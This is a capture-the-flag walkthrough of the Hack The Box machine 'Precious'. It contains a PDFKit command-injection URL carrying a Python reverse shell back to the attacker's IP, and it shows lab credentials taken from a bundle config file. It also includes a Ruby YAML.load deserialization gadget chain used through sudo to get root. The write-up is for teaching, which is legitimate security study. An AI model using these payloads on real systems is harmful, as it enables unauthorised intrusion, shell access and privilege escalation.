# Precious

As a first stage we are going to do our usual nmap scan. Our host’s IP today is `10.10.11.189` but as always your IP may be different so if you’re following along and copy/pasting, it may be because you copied the IP address and didn’t change it.

```jsx
nmap -sC -sV 10.10.11.189 -oN nmap.log

```

As usual, running our standard nmap scanning, using `-sC -sV` and `-oN` to run nmap. For reference `-sC` runs a set of default scripts against discovered ports (only run this when you have permission, or are in a CTF environment that allows it), `-sV` enables version detection and `-oN <filename>` outputs the results in a file in the same format that nmap writes to the terminal.

Okay, so what next? We’ve found two services running on the host. `ssh` can wait until later, it’s vary rarely the initial path in CTFs like these, so let’s look at the HTTP service on port 80. Very quickly we find trying to go to `[http://10.10.11.189](http://10.10.11.189)` redirects us to `precious.htb`. Okay, good, except we can’t get there because our computer doesn’t know the IP for the DNS name `precious.htb` so we’ll need to hope in to `/etc/hosts` and add `10.10.11.189 precious.htb` .

Now we can navigate to `precious.htb` and have a look around.

What we see is this form asking us to convert a web page somewhere out there on the internet to a PDF.

![Screenshot from 2023-02-15 13-22-38.png](Images/Screenshot_from_2023-02-15_13-22-38.png)

This is great, we don’t have to do much searching around for the next point of exploit, this is probably it. 

We spin up a quick `python -m http.server 1234` on our machine (we did it in the directory we were using for this box). As you can see when we put `http://<our_local_IP>:1234` we get the default python http server directory listing, containing the nmap file from above and a gobuster log that didn’t end up going anywhere so we don’t go in to that in this writeup.

![Untitled](Images/Untitled.png)

We briefly try a couple of potential RCE’s to see what happens (the below is just the directory listing). This was done blind, sometimes you can save time by just trying something without much investigation.

![Screenshot from 2023-02-15 13-22-16.png](Images/Screenshot_from_2023-02-15_13-22-16.png)

The python file just returns as text in a PDF, no bueno there.

![Screenshot from 2023-02-15 13-22-23.png](Images/Screenshot_from_2023-02-15_13-22-23.png)

But the PHP file returns an error (which we didn’t get a shot of, it doesn’t matter, as both these weren’t actually useful, let’s continue).

Okay, so PDF converts on the internet that can read web pages. If you’ve got time have a read of the below.

[https://www.sidechannel.blog/en/html-to-pdf-converters-can-i-hack-them/](https://www.sidechannel.blog/en/html-to-pdf-converters-can-i-hack-them/)

It appears there are two main problems with web-based PDF converters:

- Modern pages only render properly after loading a bunch of Javascript, so some PDF readers will process javascript to render the page before converting to PDF.
- Some PDF converters might have other vulnerabilities, such as RCE or LFI.

Let’s fire up Burp and have a look at the underlying request to see if we can get more context.

For this we just navigated to [`http://10.10.16.3:8000/?test%25`](http://10.10.16.3:8000/?test%25) which errors out (replace the IP and port with your IP and port, naturally).

![Untitled](Images/Untitled%201.png)

If you look at the `X-Runtime` header you can see that the server is actually running Ruby, less common that Python and PHP in these things, but plenty of the internet still runs on it.

Now it’s time to return to our (somewhat ailing) friend, Google, to look for how we can leverage this knowledge. We have a PDF generator library used in Ruby. The [sidechannel.blog](http://sidechannel.blog) article above did look at PDFKit for Ruby and even without specifying that in our search we see that there’s a [snyk.io](http://snyk.io) article for command injection with PDFKit. (snyk is a pretty good Software Composition Analysis tool).

![Untitled](Images/Untitled%202.png)

[https://security.snyk.io/vuln/SNYK-RUBY-PDFKIT-2869795](https://security.snyk.io/vuln/SNYK-RUBY-PDFKIT-2869795)

An example given in that article is: 

```jsx
irb(main):060:0> puts PDFKit.new("http://example.com/?name=#{'%20`sleep 5`'}").command wkhtmltopdf --quiet [...] "http://example.com/?name=%20`sleep 5`" - => nil
```

While we can’t actually see the Ruby script being used to generate our PDF, it looks like it would be using something like `[PDFKit.new](http://PDFKit.new)` , and when you pass it a URL containing a URL encoded character in the query parameters (anything after a `?` in a URL) and then run your command inside backticks (any old linux command) you should see the results return. Why this works? I’m no Ruby expert, but I’d say the URL Encoding makes Ruby handle the string differently and backticks are a way to send output to a shell, or potentially PDFKit runs `wget` or `curl` as a subprocess, and through this we can get additional commands run as a part of that subprocess.

Moving forwards we can set up our test with `http://<your_host_ip>:<port>?%20`whoami``

![Untitled](Images/Untitled%203.png)

![Untitled](Images/Untitled%204.png)

Oh wow! It works! That’s awesome. If you can’t see it it’s the word “ruby” in the above screenshot, that’s our user.

For reference we try a few different reverse shells, given we’ve got command exec on the server we’re not trying to use a ruby reverse shell (where we inject code in to the process running ruby), we can just shell out to python (via `sh` or `bash` , whichever ruby is shelling out to). We’re going to run python and use the `sockets` library. Don’t forget to change the IP in `s.connect` to your IP as this is a reverse shell, so the target is talking back to our machine instead of our machine talking to the server.

```jsx
http://10.10.16.2:8000?%20`python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.16.2",8080));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'`
```

![Untitled](Images/Untitled%205.png)

And we catch a shell. As we specified `/bin/sh` that’s what we get. Let’s try and upgrade so that we get all the nice things like not deleting our shell when we `ctrl+c`

Here we go. Inside our reverse shell:

```jsx
python3 -c 'import pty; pty.spawn("/bin/bash")'
[CTRL]+Z
stty raw -echo;fg
```

After we `ctrl+z` we will end up back in our local session because we’ve backgrounded netcat. The final line sets up to pass through all input to our reverse shell and then foreground netcat again.

For a quick side trip we can have a look at the app code used to generate PDFs. An interesting note is that rather than update the version of PDFKit used the author here changes the reported version. This means that if you look at the PDF metadata you will see a reported version of PDFKit that isn’t vulnerable.

```jsx
begin
           PDFKit.new(url).to_file(path)
          cmd = `exiftool -overwrite_original -all= -creator="Generated by pdfkit v0.8.6" -xmptoolkit= #{path}`
          send_file path, :disposition => 'attachment'
      rescue
```

We continue onwards.

We do some quick enumeration of the passwd file and there is another user on the box `henry` that likely holds our user flag.

```jsx

cat: user.txt: Permission denied
```

Looks like we need to find a way to jump across to Henry.

We try [linpeas.sh](http://linpeas.sh) (after manually checking capabilities, `sudo -l` , etc) but nothing interesting. There is a non-standard directory in the `ruby` user’s home directory (`.bundle`)

```jsx
╔══════════╣ Searching root files in home dirs (limit 30)
/home/                                                                                                                                                                 
/home/henry/user.txt
/home/henry/.bash_history
/home/ruby/.bundle
/home/ruby/.bundle/config
/home/ruby/.bash_history
```

In the hidden bundle directory is a config file.

```jsx
ruby@precious:~/.bundle$ ls -la
total 12
dr-xr-xr-x 2 root ruby 4096 Oct 26 08:28 .
drwxr-xr-x 3 ruby ruby 4096 Oct 26 08:28 ..
-r-xr-xr-x 1 root ruby   62 Sep 26 05:04 config
```

Looking at the contents of the file we find a username and password, presumably this was meant to simulate stored creds to pull from some sort of package manager.

```jsx
uby@precious:~/.bundle$ cat config
---
BUNDLE_HTTPS://RUBYGEMS__ORG/: "henry:Q3c1AqGHtoI0aXAYFH"
```

This is where SSH comes back in to play. Let’s SSH in as henry to our target.

```jsx
ssh henry@precious.htb
```

We log in, and the first thing we check is `sudo` . Bonza! We’ve got permissions to do something. In the CTF meta (at least for the easier boxes on HTB) this is the path we need to take. 

```jsx
henry@precious:~$ sudo -l
Matching Defaults entries for henry on precious:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User henry may run the following commands on precious:
    (root) NOPASSWD: /usr/bin/ruby /opt/update_dependencies.rb
```

So we take a look at what `update_dependencies.rb` is doing to figure out how to escalate:

```jsx
henry@precious:~$ cat /opt/update_dependencies.rb
# Compare installed dependencies with those specified in "dependencies.yml"
require "yaml"
require 'rubygems'

# TODO: update versions automatically
def update_gems()
end

def list_from_file
    YAML.load(File.read("dependencies.yml"))
end

def list_local_gems
    Gem::Specification.sort_by{ |g| [g.name.downcase, g.version] }.map{|g| [g.name, g.version.to_s]}
end

gems_file = list_from_file
gems_local = list_local_gems

gems_file.each do |file_name, file_version|
    gems_local.each do |local_name, local_version|
        if(file_name == local_name)
            if(file_version != local_version)
                puts "Installed version differs from the one specified in file: " + local_name
            else
                puts "Installed version is equals to the one specified in file: " + local_name
            end
        end
    end
end
```

The code doesn’t do much apart from loading a [YAML](https://ruby-doc.org/stdlib-2.7.0/libdoc/yaml/rdoc/YAML.html) file. The YAML documentation clearly states not to load templates from untrusted sources. 

Let’s see what sort of YAML structure we need.

There are tons of examples online showing how to get full RCE using `YAML.load` so lets try one: ([https://staaldraad.github.io/post/2019-03-02-universal-rce-ruby-yaml-load/](https://staaldraad.github.io/post/2019-03-02-universal-rce-ruby-yaml-load/)).

Looking at the PoC we have valid ruby code, but tabbed and in-lined in the format of Ruby. I’m not super familiar with Ruby, but it looks like you’re meant to be able to define code in these templates (maybe for some in-line logic?), but this also lets us build our ability to update.

```jsx
---
- !ruby/object:Gem::Installer
    i: x
- !ruby/object:Gem::SpecFetcher
    i: y
- !ruby/object:Gem::Requirement
  requirements:
    !ruby/object:Gem::Package::TarReader
    io: &1 !ruby/object:Net::BufferedIO
      io: &1 !ruby/object:Gem::Package::TarReader::Entry
         read: 0
         header: "abc"
      debug_output: &1 !ruby/object:Net::WriteAdapter
         socket: &1 !ruby/object:Gem::RequestSet
             sets: !ruby/object:Net::WriteAdapter
                 socket: !ruby/module 'Kernel'
                 method_id: :system
             git_set: id
         method_id: :resolve
```

It looks like it is loading the file from the same directory `/opt` but unfortunately we don’t have write permissions there, but after a little Ruby refresher, we discover that Ruby actually reads files from the CWD when you run the script, not relative to the script location. so we can use anywhere we have write permissions, as long as we are in that directory when we run the script!

So in the henry home directory `nano dependencies.yml` and copy in the above code. Change the `git_set: id` to `git_set: bash`.

```jsx
henry@precious:~$ sudo /usr/bin/ruby /opt/update_dependencies.rb
sh: 1: reading: not found
uid=0(root) gid=0(root) groups=0(root)
```

```jsx
henry@precious:~$ sudo /usr/bin/ruby /opt/update_dependencies.rb
sh: 1: reading: not found
root@precious:/home/henry# cat /root/root.txt
e3d9..e43
root@precious:/home/henry#
```

And get root. And from root we get the flag.

Fin.

Looks like there is a script on Exploit-DB to run commands and generate a full reverse shell for the initial foothold (pdfkit)
